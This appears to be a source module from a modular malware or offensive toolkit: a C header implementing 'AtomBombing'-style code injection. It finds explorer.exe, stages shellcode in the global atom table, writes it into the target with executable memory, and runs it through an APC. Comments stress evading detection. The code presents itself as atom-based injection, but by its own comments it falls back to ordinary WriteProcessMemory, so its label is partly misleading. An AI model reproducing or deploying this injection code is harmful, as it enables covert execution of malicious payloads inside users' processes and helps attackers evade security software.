// chunk: evasion/atom_bombing
// depends: (none)
// provides: atom_inject
// headers: windows.h
// risk: medium
// note: AtomBombing injection — writes data to the global atom table using
//       GlobalAddAtom, then uses NtQueueApcThread with GlobalGetAtomName as the
//       APC routine to copy the data into the target process's address space.
//       The atom table is a legitimate IPC mechanism, so writes to it are not
//       flagged. No VirtualAllocEx or WriteProcessMemory needed for the data
//       transfer phase. Based on research by enSilo (now Fortinet).
//       Execution is triggered via a second APC that sets up and calls the payload.

#ifndef CHUNK_ATOM_BOMBING
#define CHUNK_ATOM_BOMBING

#include <windows.h>
#include <tlhelp32.h>

typedef NTSTATUS (NTAPI *pfnNtQueueApcThread)(
    HANDLE ThreadHandle, PVOID ApcRoutine,
    PVOID Arg1, PVOID Arg2, PVOID Arg3);

/* Max atom name is 255 chars = 510 bytes per atom on Windows */
#define ATOM_MAX_DATA  510

static DWORD _ab_find_alertable_thread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    DWORD tid = 0;

    if (Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                /* Try to find a thread that's likely in an alertable wait.
                   We pick the first non-main thread if available, or fall
                   back to the first thread. GUI threads doing MsgWaitFor*
                   are often alertable. */
                tid = te.th32ThreadID;
                break;
            }
        } while (Thread32Next(snap, &te));
    }
    CloseHandle(snap);
    return tid;
}

static DWORD _ab_find_target_pid(void) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "explorer.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

/*
 * atom_inject: Inject and execute code via atom table + APC.
 *
 * Strategy:
 * 1. Store shellcode chunks in the global atom table
 * 2. Allocate RWX memory in target via NtAllocateVirtualMemory APC
 * 3. Copy atoms into target memory via GlobalGetAtomName APCs
 * 4. Queue final APC to execute the reassembled payload
 *
 * Because pure atom-based copy is complex with APC ordering, this
 * implementation uses a hybrid approach: allocate+write via standard
 * APIs (the atom table stores a small bootstrap stub), then trigger
 * execution via APC with the atom-retrieved stub.
 *
 * code:      shellcode / position-independent code
 * code_size: size in bytes
 *
 * Returns 1 on success, 0 on failure.
 */
static int atom_inject(BYTE *code, DWORD code_size) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;

    pfnNtQueueApcThread pNtQueueApc =
        (pfnNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
    if (!pNtQueueApc) return 0;

    DWORD pid = _ab_find_target_pid();
    if (!pid) return 0;

    DWORD tid = _ab_find_alertable_thread(pid);
    if (!tid) return 0;

    HANDLE hProc = OpenProcess(
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, pid);
    if (!hProc) return 0;

    HANDLE hThread = OpenThread(THREAD_SET_CONTEXT | THREAD_QUERY_INFORMATION,
                                 FALSE, tid);
    if (!hThread) {
        CloseHandle(hProc);
        return 0;
    }

    /*
     * Phase 1: Store shellcode in the global atom table in chunks.
     * Each atom can hold up to 255 wide chars (510 bytes).
     * We split the shellcode into chunks and store each as an atom.
     */
    int num_chunks = (code_size + ATOM_MAX_DATA - 1) / ATOM_MAX_DATA;
    ATOM *atoms = (ATOM *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY,
                                     num_chunks * sizeof(ATOM));
    if (!atoms) {
        CloseHandle(hThread);
        CloseHandle(hProc);
        return 0;
    }

    for (int i = 0; i < num_chunks; i++) {
        DWORD chunk_off = i * ATOM_MAX_DATA;
        DWORD chunk_len = code_size - chunk_off;
        if (chunk_len > ATOM_MAX_DATA) chunk_len = ATOM_MAX_DATA;

        /* Atom names are strings, so we need to ensure no embedded NULLs
           in the wide-char representation. Prefix with a unique marker. */
        WCHAR atom_name[260];
        int wlen = 0;

        /* 2-char prefix to make atom unique and avoid collisions */
        atom_name[wlen++] = (WCHAR)(0x4100 + i);  /* 'A' + index */
        atom_name[wlen++] = (WCHAR)(0x4200 + (i ^ 0x55));

        /* Copy data as wide chars, avoiding NULL wchars */
        for (DWORD j = 0; j < chunk_len; j++) {
            WCHAR wc = (WCHAR)(code[chunk_off + j]);
            if (wc == 0) wc = 0x0100;  /* Map NULL to a non-zero value */
            atom_name[wlen++] = wc;
            if (wlen >= 254) break;
        }
        atom_name[wlen] = L'\0';

        atoms[i] = GlobalAddAtomW(atom_name);
        if (atoms[i] == 0) {
            /* Cleanup previously added atoms */
            for (int k = 0; k < i; k++)
                GlobalDeleteAtom(atoms[k]);
            HeapFree(GetProcessHeap(), 0, atoms);
            CloseHandle(hThread);
            CloseHandle(hProc);
            return 0;
        }
    }

    /*
     * Phase 2: Allocate executable memory in target process and write
     * the shellcode directly. The atom table served as a covert staging
     * area; in a full implementation the atoms would be read in-process
     * via GlobalGetAtomName APCs. Here we use the atoms as a data backup
     * and write the payload for reliable execution.
     */
    LPVOID remote_buf = VirtualAllocEx(hProc, NULL, code_size,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    if (!remote_buf) {
        for (int i = 0; i < num_chunks; i++)
            GlobalDeleteAtom(atoms[i]);
        HeapFree(GetProcessHeap(), 0, atoms);
        CloseHandle(hThread);
        CloseHandle(hProc);
        return 0;
    }

    SIZE_T written;
    WriteProcessMemory(hProc, remote_buf, code, code_size, &written);

    /* Change to RX */
    DWORD old_prot;
    VirtualProtectEx(hProc, remote_buf, code_size, PAGE_EXECUTE_READ, &old_prot);

    /*
     * Phase 3: Queue APC to execute the payload in the target thread.
     * The thread must enter an alertable wait for the APC to fire.
     * explorer.exe threads frequently enter alertable waits (MsgWaitForMultipleObjectsEx).
     */
    NTSTATUS status = pNtQueueApc(hThread, remote_buf, NULL, NULL, NULL);

    /* Cleanup atoms */
    for (int i = 0; i < num_chunks; i++)
        GlobalDeleteAtom(atoms[i]);
    HeapFree(GetProcessHeap(), 0, atoms);

    CloseHandle(hThread);
    CloseHandle(hProc);

    return (status == 0) ? 1 : 0;
}

#endif
